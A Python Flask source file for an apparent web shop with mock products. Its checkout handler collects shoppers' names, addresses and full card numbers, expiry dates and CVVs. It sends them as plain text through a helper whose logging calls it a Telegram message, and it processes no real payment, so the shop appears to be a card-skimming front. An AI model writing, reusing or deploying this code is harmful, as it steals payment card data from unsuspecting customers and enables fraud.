import json
from flask import Flask, render_template, request, redirect
import tools
from tabulate import tabulate
import logging
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
import os



app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///app.db'

db = SQLAlchemy(app)
migrate = Migrate(app, db)

import models
import routes


@app.route('/')
def index():
    """
    Renders the home page with a list of mock products.
    """
    products_query = models.Product.query.all()

    product_list = [
        {
            "id": p.id,
            "title": p.title,
            "price": p.price,
            "description": p.description,
            "image": p.image,
        }
        for p in products_query
    ]

    # Convert list to JSON string
    products = product_list

    return render_template('index.html', products=products)

@app.route('/product')
def product():
    """
    Renders the product page with a list of mock products.
    """
    products = models.Product.query.all()

    product_list = [
        {
            "id": p.id,
            "title": p.title,
            "price": p.price,
            "description": p.description,
            "image": p.image,
        }
        for p in products
    ]

    # Convert list to JSON string
    products = product_list
    return render_template('product.html', products=products)
    
@app.route('/about')
def about():
    """
    Renders the about page.
    """
    products = models.Product.query.all()
    return render_template('about.html')

@app.route('/cart')
def cart():
    """
    Renders the shopping cart page.
    """
    return render_template('cart.html')

@app.route('/checkout')
def checkout():
    """
    Renders the checkout page.
    """
    return render_template('checkout.html')

@app.route('/test')
def test():
    """
    A test route to verify the server is running.
    """
    return render_template('test.html')




@app.post('/submit-order')
def submit_order():
    """
    Handles the order submission from the checkout page.
    This is a placeholder function that currently does nothing.
    """
    form = request.form
    first_name = form.get('firstName')
    last_name = form.get('lastName')
    email = form.get('email')
    address = form.get('address')
    city = form.get('city')
    state = form.get('state')
    zip_code = form.get('zip')
    payment_method = form.get('paymentMethod')
    credit_card_name = form.get('creditCardName')
    credit_card_number = form.get('creditCardNumber')
    credit_card_expiration = form.get('creditCardExpiration')
    credit_card_cvv = form.get('creditCardCvv')

    cart_list_raw = form.get('cart_list', '[]')
    try:
        cart_list = json.loads(cart_list_raw)
    except json.JSONDecodeError:
        logging.error(f"Invalid cart_list JSON: {cart_list_raw}")
        cart_list = []

    index = 0
    item_row = []
    for item in cart_list:
        item_row.append([index + 1, f"{item['title'][0:8]}...", f"{float(item['price']):.2f}", item['quantity']]) 
        index += 1

    table = tabulate(item_row, headers=['#', 'Product', 'Price', 'Quantity'], tablefmt='github')
    html = f"Customer: {first_name} {last_name}\n" 
    html += f"Email: {email}\n"
    html += f"Address: {address}, {city}, {state}, {zip_code}\n"
    html += f"Payment Method: {payment_method}\n"
    html += f"Credit Card Name: {credit_card_name}\n"
    html += f"Credit Card Number: {credit_card_number}\n"
    html += f"Credit Card Expiration: {credit_card_expiration}\n"
    html += f"Credit Card CVV: {credit_card_cvv}\n"

    html += f"-----------------------------------\n"
    html += f"<pre>{table}</pre>\n"
    html += f"-----------------------------------\n"


    tele_res = tools.sendMessage(html)

    if tele_res is None:
        logging.error("Telegram message failed: No response received.")
    elif not tele_res.get('ok', False):
        logging.error(f"Telegram message failed: {tele_res.get('description', 'No description')}")
    
    return redirect('/order_success')
            

@app.route('/order_success')
def order_success():
    """
    Renders the order success page after an order is submitted.
    """
    return render_template('order_success.html')


if __name__ == '__main__':
    app.run(debug=True)
